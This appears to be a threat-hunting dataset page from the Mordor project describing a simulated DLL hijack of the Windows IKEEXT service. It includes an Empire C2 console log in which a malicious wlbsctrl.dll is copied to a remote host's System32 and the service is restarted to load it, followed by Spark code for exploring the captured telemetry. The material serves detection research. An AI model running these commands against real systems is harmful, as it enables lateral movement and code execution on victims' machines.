# SCM and Dll Hijacking IKEEXT

## Metadata


|                   |    |
|:------------------|:---|
| id                | SDWIN-190403133337 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/04/03 |
| platform          | Windows |
| Mordor Environment| Mordor shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | None |
| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/defense_evasion/empire_scm_dll_hijack_ikeext.tar.gz |

## Dataset Description
This dataset represents adversaries copying a file remotely to replace the wlbsctrl.dll file which is executed by the IKEEXT (vulnerable to DLL hijack).

## Adversary View
```
(Empire: NZB6SE34) > upload /tmp/wlbsctrl.dll
[*] Tasked agent to upload wlbsctrl.dll, 124 KB
[*] Tasked NZB6SE34 to run TASK_UPLOAD
[*] Agent NZB6SE34 tasked with task ID 46
(Empire: NZB6SE34) > shell COPY .\wlbsctrl.dll \\HR001\C$\Windows\System32\wlbsctrl.dll
[*] Tasked NZB6SE34 to run TASK_SHELL
[*] Agent NZB6SE34 tasked with task ID 47
(Empire: NZB6SE34) > ..Command execution completed.

(Empire: NZB6SE34) > shell sc.exe `\`\HR001 stop IKEEXT
[*] Tasked NZB6SE34 to run TASK_SHELL
[*] Agent NZB6SE34 tasked with task ID 48
(Empire: NZB6SE34) > SERVICE_NAME: IKEEXT 
      TYPE               : 30  WIN32  
      STATE              : 3  STOP_PENDING 
                              (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
      WIN32_EXIT_CODE    : 0  (0x0)
      SERVICE_EXIT_CODE  : 0  (0x0)
      CHECKPOINT         : 0x0
      WAIT_HINT          : 0x1388

..Command execution completed.

(Empire: NZB6SE34) > shell sc.exe `\`\HR001 query IKEEXT
[*] Tasked NZB6SE34 to run TASK_SHELL
[*] Agent NZB6SE34 tasked with task ID 49
(Empire: NZB6SE34) > SERVICE_NAME: IKEEXT 
      TYPE               : 20  WIN32_SHARE_PROCESS  
      STATE              : 1  STOPPED 
      WIN32_EXIT_CODE    : 0  (0x0)
      SERVICE_EXIT_CODE  : 0  (0x0)
      CHECKPOINT         : 0x0
      WAIT_HINT          : 0x0

..Command execution completed.

(Empire: NZB6SE34) > shell sc.exe `\`\HR001 start IKEEXT
[*] Tasked NZB6SE34 to run TASK_SHELL
[*] Agent NZB6SE34 tasked with task ID 50
(Empire: NZB6SE34) > SERVICE_NAME: IKEEXT 
      TYPE               : 30  WIN32  
      STATE              : 2  START_PENDING 
                              (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
      WIN32_EXIT_CODE    : 0  (0x0)
      SERVICE_EXIT_CODE  : 0  (0x0)
      CHECKPOINT         : 0x0
      WAIT_HINT          : 0x7d0
      PID                : 4500
      FLAGS              : 

..Command execution completed.

(Empire: NZB6SE34) > 
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/defense_evasion/empire_scm_dll_hijack_ikeext.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        